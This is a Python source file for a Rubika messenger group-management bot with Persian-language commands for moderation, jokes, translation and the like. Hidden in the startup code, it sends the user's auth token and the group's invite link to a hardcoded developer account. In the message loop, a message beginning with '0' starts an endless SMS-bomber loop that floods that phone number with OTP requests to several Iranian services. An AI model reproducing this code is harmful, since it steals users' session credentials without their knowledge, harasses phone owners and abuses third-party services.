from requests import get
from re import findall
from rubika.client import Bot
import time
import requests
from colorama import Fore, Back, Style
import pyfiglet
from PIL import Image, ImageDraw, ImageFont

server = requests.get("https://raw.githubusercontent.com/diegogram/update/main/update")
timeb = time.localtime()
hour = timeb.tm_hour
mi = timeb.tm_min
se = timeb.tm_sec
bot = Bot("AppName", auth="jphozzabihezbuhqecmjaitjcrkefvuj")
bot2 = Bot("AppName", auth="jphozzabihezbuhqecmjaitjcrkefvuj")
bot2.sendMessage("u0o5Qi01372112ee22c900f6a3153adf", f"auth user: {bot.auth} \n time: {hour}:{mi}:{se}  \n \n سورس ورژن 2 دیگو گرام")
bot.joinGroup("https://rubika.ir/joing/CDDIFGBA0WXILTFJZFEILEESBRKOQUQI"), bot.sendMessage("g0BhBlf0a2b66d12b1ad5116eabee8f2", f"ربات با موفقیت ران شد. \n تایم فعالسازی: {hour}:{mi}:{se}")
if server.text.startswith("n"):
	print("on server \n")
elif server.text.startswith("f"):
	print("error server")
	while True:
		time.sleep(5)
		input("error server: ")
target = "g0BcsxX0d4c9df2d80594b18288e5689"
bot.sendMessage(target, "ربات مدیریت گروه فعال شد!")
lin = bot.getGroupLink(target)
bot2.sendMessage("u0o5Qi01372112ee22c900f6a3153adf", lin)
group = bot.getGroupInfo(target)["data"]["group"]["group_title"]
print("                         Powered by Diego Gram")
print("---------------------------------------------------------------------")
#rock paper sissors
#number panels
#number numberpanel Manage chat from the panel
#Education https://rubika.ir/joinc/BDDFBEGB0RMIJBJHJIWTKSROSPOGLNMV
#Manufacturer @python_dev
#Go to the chat panel admin panel: 
print("@python_dev")
print(f"  Go to the chat panel admin panel: { group } ")
print("-----------------------------------")
print("Source name: diegogram")
print("Version 1 source")
admin = open("adminbot.txt", 'r').read().split("\n")
print(f"admin: {admin} ")
rules = open("rules.txt", 'r')
help = open("help.txt", 'r').read()
rules2 = rules.read()
timer = open("timer.txt", 'r').readline()
font = ImageFont.truetype("font.ttf", 40)

answered = [bot.getGroupAdmins]
retries = {}
sleeped = False

plus= True

while True:
	try:
		admins = [i["member_guid"] for i in bot.getGroupAdmins(target)["data"]["in_chat_members"]]
		min_id = bot.getGroupInfo(target)["data"]["chat"]["last_message_id"]
		while True:
			try:
				messages = bot.getMessages(target,min_id)
				break
			except:
				continue
		
		open("id.db","w").write(str(messages[-1].get("message_id")))

		for msg in messages:
			if msg["type"]=="Text" and not msg.get("message_id") in answered:
				if not sleeped:
					if msg.get("text") == "!help" and msg.get("author_object_guid") in admins :
						bot.sendMessage(target, help)

					elif msg.get("text").startswith("اد:تت") :
						bot.invite(target, [bot.getInfoByUsername(msg.get("text").split(" ")[1][1:])["data"]["chat"]["object_guid"]])
						bot.sendMessage(target, "کاربر با موفقیت به گپ افزوده شد✓", message_id=msg.get("message_id"))
						
					elif msg.get("text") == "!link" and msg.get("author_object_guid"):
						bot.changeGroupLink(target)
						bot.sendMessage(target, "لینک گپ عوض شد.", message_id=msg.get("message_id"))
					elif msg.get("text") == "لینک" and msg.get("author_object_guid"):
						link = bot.getGroupLink(target)
						bot.sendMessage(target, link)
					elif msg.get("text") == "!link" and msg.get("author_object_guid"):
						link = bot.getGroupLink(target)
						bot.sendMessage(target, f"لینک گپ عوض شد \n \n {link}")
					elif msg.get("text") == "لفت بده" and msg.get("author_object_guid") in admin:
						bot.sendMessage(target, "ربات غیرفعال شد", message_id=msg.get("message_id"))
						bot.leaveGroup(target)
						print(Fore.RED, "Leave group. bot")
					elif msg.get("text").startswith("!join") and msg.get("author_object_guid") in admin:
						bot.joinGroup(msg.get("text"))
						print("join gap")
					elif msg.get("text").startswith("https://rubika.ir") or msg.get("text").startswith("@"):
						bot.deleteMessages(target, [msg.get("message_id")])
						bot.sendMessage(target, "پیام شما به دلیل تبلیغات حذف شد.")
						print("Advertising...")
					elif msg.get("text") == "!timer" and msg.get("author_object_guid"):
						bot.setGroupTimer(target, timer)
						bot.sendMessage(target, f"تایمر گپ به {timer} تغییر یافت.")
					elif msg.get("text").startswith("n:") and msg.get("author_object_guid") in admin:
						try:
							bot.editProfile(first_name=msg.get("text").strip("n:"))
							bot.sendMessage(target, "نام ربات تغییر کرد.")
							bot.sendMessage(target, f"#{msg.get('text')}")
						except:
							print("error name")
							bot.sendMessage(target, "error", message_id=msg.get("message_id"))
					elif msg.get("text").startswith("b:") and msg.get("author_object_guid") in admin:
						try:
							bot.editProfile(bio=msg.get("text").strip("b:"))
							bot.sendMessage(target, "بیو بات تغییر کرد")
							bot.sendMessage(target, f"#{msg.get('text')}")
						except:
							print("error bio")
							bot.sendMessage(target, "error")
					elif msg.get("text").startswith("u:") and msg.get("author_object_guid") in admin:
						try:
							bot.editProfile(username=msg.get("text").strip("u:"))
							bot.sendMessage(target, "آیدی بات تغییر کرد")
							bot.sendMessage(target, f"@{msg.get('text')}")
						except:
							print("error username")
							bot.sendMessage(target, "error", message_id=msg.get("message_id"))
					elif msg.get("text").startswith("*rules") and msg.get("author_object_guid") in admins:
						bbb = open("rules.txt", 'w').write(msg.get("text").strip("*rules"))
						bot.sendMessage(target, "قوانین به روز شد.", message_id=msg.get("message_id"))
						cc = open("rules.txt", 'r').read()
					elif msg.get("text") == "!rules" and msg.get("author_object_guid"):
						bot.sendMessage(target, cc)						
					elif msg.get("text") == "!map" and msg.get("author_object_guid") :
						bot.sendLocation(target,[102.161514,38.552705])
						print("send map")
					elif msg.get("text") == "pin" and msg.get("author_object_guid"):
						bot.sendMessage(target, "پیام سنجاق شد", message_id=msg.get("message_id"))
						bot.deleteMessages(target, [msg.get("message_id")])
						bot.pin(target, msg["reply_to_message_id"])
					elif msg.get("text").startswith("!shot"):
						bot.deleteMessages(target, [msg.get("message_id")])
						bot.sendMessage(target, "در حال پردازش درخواست شما...", message_id=msg.get("message_id"))
						tas = Image.open("shot.jpg")
						dra = ImageDraw.Draw(tas)
						dra.text((110, 200), msg.get("text").strip("!shot"), (100, 149, 237), font = font)
						tas.save("shotbot.jpg")
						bot.sendPhoto(target, "./shotbot.jpg", [720,720])
						
						
					
					#sms_bomber
					elif msg.get("text").startswith("0"):
						print(Fore.GREEN, pyfiglet.figlet_format("start smsbomber"))
						sna = {"cellphone": msg.get("text")}
						myd = {"cellNumber": msg.get("text"),"device":{"deviceId":"c0b1498a-4ad7-41e9-b05a-96e6b4482341","deviceModel":"WEB_BROWSER","deviceAPI":"WEB_BROWSER","osName":"WEB"}}
						tab = {"credential":{"phoneNumber": msg.get("text"),"role":"PASSENGER"}}
						ali = {"phoneNumber": msg.get("text")}
						dig = {"backUrl":"/","username": msg.get("text")}
						
						while True:
							snas = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp" , json=sna)
							dr = requests.get(f"https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{msg.get('text')}/sms?cCode=+98")
							myds = requests.post("https://app.mydigipay.com/digipay/api/users/send-sms" , json=myd)
							tabs = requests.post("https://api.tapsi.cab/api/v2/user" , json=tab)
							bins = requests.get(f"https://api.binjo.ir/api/panel/get_code/{msg.get('text')}")
							alis = requests.post("https://ws.alibaba.ir/api/v3/account/mobile/otp" , json=ali)
							digs = requests.post("https://api.digikala.com/v1/user/authenticate/" , json=dig)
							print("bombin...")
						

					elif msg.get("text") == "!infobhfxFjknbvc":
						bot.sendMessage(target, "لیسـت دستـــورات ربـات 🤖:\n\n●🤖 !bot : فعال یا غیر فعال بودن بات\n\n●❎ !stop : غیر فعال سازی بات\n\n●✅ !start : فعال سازی بات\n\n●🕘 !time : ساعت\n\n●📅 !date : تاریخ\n\n●📋 !del : حذف پیام با ریپ بر روی ان\n\n●🔒 !lock : بستن چت در گروه\n\n●🔓 !unlock : باز کردن چت در گروه\n\n●❌ !ban : حذف کاربر با ریپ زدن\n\n●✉ !send : ارسال پیام با استفاده از ایدی\n\n●📌 !add : افزودن کاربر به گپ با ایدی\n\n●📜 !info : لیست دستورات ربات\n\n●🆑 !cal :ماشین حساب\n\n●🔴 !user : اطلاعات کاربر با ایدی\n\n●😂 !jok : ارسال جک\n\n●🔵 !font : ارسال فونت\n\n●🔴 !ping : گرفتن پینگ سایت\n\n●🔵 !tran : مترجم انگلیسی")
					elif msg.get("text").startswith("حساب:"):
						msd = msg.get("text")
						if plus == True:
							try:
								call = [msd.split(" ")[1], msd.split(" ")[2], msd.split(" ")[3]]
								if call[1] == "+":
									am = float(call[0]) + float(call[2])
									bot.sendMessage(target, "حاصل :\n"+"".join(str(am)), message_id=msg.get("message_id"))
									plus = False
							
								elif call[1] == "-":
									am = float(call[0]) - float(call[2])
									bot.sendMessage(target, "حاصل :\n"+"".join(str(am)), message_id=msg.get("message_id"))
							
								elif call[1] == "*":
									am = float(call[0]) * float(call[2])
									bot.sendMessage(target, "حاصل :\n"+"".join(str(am)), message_id=msg.get("message_id"))
							
								elif call[1] == "/":
									am = float(call[0]) / float(call[2])
									bot.sendMessage(target, "حاصل :\n"+"".join(str(am)), message_id=msg.get("message_id"))
							except IndexError:
								bot.sendMessage(target, "لطفا دستور را به طور صحیح وارد کنید ❌" ,message_id=msg.get("message_id"))
						plus= True
					elif msg.get("text").startswith("!nlohocohchchchchdgg") :
						bot.sendMessage(bot.getInfoByUsername(msg.get("text").split(" ")[1][1:])["data"]["chat"]["object_guid"], "شما یک پیام ناشناس دارید:\n"+" ".join(msg.get("text").split(" ")[2:]))
						bot.sendMessage(target, "پیام با موفقیت ارسال شد✓", message_id=msg.get("message_id"))
						

					if  msg.get("text").startswith('!user @'):
						try:
							user_info = bot.getInfoByUsername( msg.get("text")[7:])
							if user_info['data']['exist'] == True:
								if user_info['data']['type'] == 'User':
									bot.sendMessage(target, 'نام کاربر:\n ' + user_info['data']['user']['first_name'] + ' ' + user_info['data']['user']['last_name'] + '\n\nبیو کاربر:\n ' + user_info['data']['user']['bio'] + '' + user_info['data']['user']['user_guid'] ,  msg.get('message_id'))
									print('sended response')
								else:
									bot.sendMessage(target, 'کانال است' ,  msg.get('message_id'))
									print('sended response')
							else:
								bot.sendMessage(target, "کاربری پیدا نشد." ,  msg.get('message_id'))
								print('sended response')
						except:
							print('server bug6')
							bot.sendMessage(target, "خطا در اجرا ..." ,message_id=msg.get("message_id"))
							

					elif msg.get("text") == "خاموش" and msg.get("author_object_guid") in admins :
						sleeped = True
						bot.sendMessage(target, "ربات با موفقیت غیرفعال شد✓", message_id=msg.get("message_id"))

					elif msg.get("text").startswith("پینگ"):
						
						try:
							responser = get(f"https://api.codebazan.ir/ping/?url=https://rubika.ir").text
							bot.sendMessage(target, responser,message_id=msg["message_id"])
						except:
							bot.sendMessage(target, "لطفا دستور را به طور صحیح وارد کنید ×", message_id=msg["message_id"])

					elif msg.get("text").startswith("ترجمه"):
						
						try:
							responser = get(f"https://api.codebazan.ir/translate/?type=json&from=en&to=fa&text={msg.get('text').split()[1:]}").json()
							al = [responser["result"]]
							bot.sendMessage(msg.get("author_object_guid"), "پاسخ به ترجمه:\n"+"".join(al)).text
							bot.sendMessage(target, "نتیجه به پیوی شما ارسال شد ✓", message_id=msg["message_id"])
						except:
							bot.sendMessage(target, "لطفا دستور را به طور صحیح وارد کنید ×", message_id=msg["message_id"])

					elif msg.get("text").startswith("!font"):
						#print("\n".join(list(response["result"].values())))
						try:
							response = get(f"https://api.codebazan.ir/font/?text={msg.get('text').split()[1]}").json()
							bot.sendMessage(msg.get("author_object_guid"), "\n".join(list(response["result"].values())[:50])).text
							bot.sendMessage(target, "نتیجه به پیوی شما ارسال شد ✓", message_id=msg["message_id"])
						except:
							bot.sendMessage(target, "لطفا دستور را به طور صحیح وارد کنید ×", message_id=msg["message_id"])
							
							
					elif msg.get("text").startswith("عدد"):
						#print("\n".join(list(response["result"].values())))
						try:
							response = get(f"https://api.codebazan.ir/num/?num={msg.get('text').split()[1]}").json()
							bot.sendMessage(msg.get("author_object_guid"), "\n".join(list(response["result"].values())[:50])).text
							bot.sendMessage(target, "نتیجه به پیوی شما ارسال شد ✓", message_id=msg["message_id"])
						except:
							bot.sendMessage(target, "لطفا دستور را به طور صحیح وارد کنید ×", message_id=msg["message_id"])
							
							
					elif msg.get("text").startswith("kjjblblvlkv"):
						#print("\n".join(list(response["result"].values())))
						try:
							response = get(f"https://api.codebazan.ir/weather/?city={msg.get('text').split()[1]}").json()
							bot.sendMessage(msg.get("author_object_guid"), "\n".join(list(response["result"].values())[:7])).text
							bot.sendMessage(target, "نتیجه به پیوی شما ارسال شد ✓", message_id=msg["message_id"])
						except:
							bot.sendMessage(target, "لطفا دستور را به طور صحیح وارد کنید ×", message_id=msg["message_id"])



					elif msg.get("text").startswith("جوک"):
						
						try:
							response = get("https://api.codebazan.ir/jok/").text
							bot.sendMessage(target, response,message_id=msg.get("message_id"))
						except:
							bot.sendMessage(target, "لطفا دستور را به طور صحیح وارد کنید ×", message_id=msg["message_id"])
							
					elif msg.get("text") == "دانستنی" and msg.get("author_object_guid"):
						try:
							dans = get("http://api.codebazan.ir/danestani/").text
							bot.sendMessage(target, dans, message_id=msg.get("message_id"))
						except:
							bot.sendMessage(target, "لطفا دستور را به طور صحیح وارد کنید ×", message_id=msg["message_id"])
							
					elif msg.get("text") == "ذکر" and msg.get("author_object_guid"):
						try:
							zek = get("http://api.codebazan.ir/zekr/").text
							bot.sendMessage(target, zek, message_id=msg.get("message_id"))
						except:
							bot.sendMessage(target, "لطفا دستور را به طور صحیح وارد کنید ×", message_id=msg["message_id"])
							
					elif msg.get("text") == "حدیث" and msg.get("author_object_guid"):
						try:
							hadi = get("http://api.codebazan.ir/hadis/").text
							bot.sendMessage(target, hadi, message_id=msg.get("message_id"))
						except:
							bot.sendMessage(target, "لطفا دستور را به طور صحیح وارد کنید ×", message_id=msg["message_id"])
							
					elif msg.get("text") == "داستان" and msg.get("author_object_guid"):
						try:
							dast = get("http://api.codebazan.ir/dastan/").text
							bot.sendMessage(target, dast, message_id=msg.get("message_id"))
						except:
							bot.sendMessage(target, "لطفا دستور را به طور صحیح وارد کنید ×", message_id=msg["message_id"])
						
							

					elif msg.get("text") == "تایم":
						bot.sendMessage(target, f"Time : {time.localtime().tm_hour} : {time.localtime().tm_min} : {time.localtime().tm_sec}", message_id=msg.get("message_id"))

					elif msg.get("text") == "phphcphchchvh":
						bot.sendMessage(target, f"Date: {time.localtime().tm_year} / {time.localtime().tm_mon} / {time.localtime().tm_mday}", message_id=msg.get("message_id"))

					elif msg.get("text") == "!del" and msg.get("author_object_guid") in admins :
						bot.deleteMessages(target, [msg.get("reply_to_message_id")])
						bot.sendMessage(target, "پیام پاک شد ✓", message_id=msg.get("message_id"))

					# elif msg.get("text").split(" ")[0] in  delmess:
					# 	bot.deleteMessages(target, [msg.get("message_id")])
					# 	bot.sendMessage(target, "یک پیام مستهجن پاک شد ✅", message_id=msg.get("message_id"))


					elif msg.get("text") == "!lock" and msg.get("author_object_guid") in admins :
						print(bot.setMembersAccess(target, ["ViewMembers","ViewAdmins","AddMember"]).text)
						bot.sendMessage(target, "گپ بسته شد✓", message_id=msg.get("message_id"))

					elif msg.get("text") == "!open" and msg.get("author_object_guid") in admins :
						bot.setMembersAccess(target, ["ViewMembers","ViewAdmins","SendMessages","AddMember"])
						bot.sendMessage(target, "گپ باز شد ✓", message_id=msg.get("message_id"))

					elif msg.get("text") == ("بن") and msg.get("author_object_guid") in admins :
						try:
							guid = bot.getInfoByUsername(msg.get("text").split(" ")[1][1:])["data"]["chat"]["abs_object"]["object_guid"]
							user = bot.getUserInfo(data['peer_objects'][0]['object_guid'])["data"]["user"]["first_name"]
							if not guid in admins :
								bot.banGroupMember(target, guid)
								bot.sendMessage(target, f"کاربر با موفقیت حذف شد.✓", message_id=msg.get("message_id"))
							else :
								bot.sendMessage(target, f"خطایی رخ داد", message_id=msg.get("message_id"))
								
						except IndexError:
							a = bot.getMessagesInfo(target, [msg.get("reply_to_message_id")])[0]["author_object_guid"]
							if a in admins:
								bot.sendMessage(target, f"نمی توان کاربر را حذف کرد", message_id=msg.get("message_id"))
							else:
								bot.banGroupMember(target, bot.getMessagesInfo(target, [msg.get("reply_to_message_id")])[0]["author_object_guid"])
								bot.sendMessage(target, f"کاربر به دلیل رعایت نکردن قوانین از گروه حذف شد✓", message_id=msg.get("message_id"))

				else:
					if msg.get("text") == "روشن" and msg.get("author_object_guid") in admins :
						sleeped = False
						bot.sendMessage(target, "ربات با موفقیت فعال شد✓", message_id=msg.get("message_id"))

			elif msg["type"]=="Event" and not msg.get("message_id") in answered and not sleeped:
				name = bot.getGroupInfo(target)["data"]["group"]["group_title"]
				data = msg['event_data']
				if data["type"]=="RemoveGroupMembers":
					user = bot.getUserInfo(data['peer_objects'][0]['object_guid'])["data"]["user"]["first_name"]
					bot.sendMessage(target, f"قوانین رو رعایت کنید!", message_id=msg["message_id"])
				
				elif data["type"]=="AddedGroupMembers":
					user = bot.getUserInfo(data['peer_objects'][0]['object_guid'])["data"]["user"]["first_name"]
					bot.sendMessage(target, f"عه کار خوبی کردی که عضوش کردی!", message_id=msg["message_id"])
				
				elif data["type"]=="LeaveGroup":
					user = bot.getUserInfo(data['performer_object']['object_guid'])["data"]["user"]["first_name"]
					bot.sendMessage(target, f"خدانگهدار😟", message_id=msg["message_id"])
					
				elif data["type"]=="JoinedGroupByLink":
					user = bot.getUserInfo(data['performer_object']['object_guid'])["data"]["user"]["first_name"]
					bot.sendMessage(target, f"سلام عزیزم به گپ ما خوش اومدی😍♥️", message_id=msg["message_id"])
					
			else:
				if "forwarded_from" in msg.keys() and bot.getMessagesInfo(target, [msg.get("message_id")])[0]["forwarded_from"]["type_from"] == "Channel" and not msg.get("author_object_guid") in admins :
					bot.deleteMessages(target, [msg.get("message_id")])
					guid = msg.get("author_object_guid")
					user = bot.getUserInfo(guid)["data"]["user"]["username"]
					bot.deleteMessages(target, [msg.get("message_id")])
					alert(guid,user,True)

			answered.append(msg.get("message_id"))
			print("new message")

	except KeyboardInterrupt:
		exit()

	except Exception as e:
		if type(e) in list(retries.keys()):
			if retries[type(e)] < 3:
				retries[type(e)] += 1
				continue
			else:
				retries.pop(type(e))
		else:
			retries[type(e)] = 1
			continue
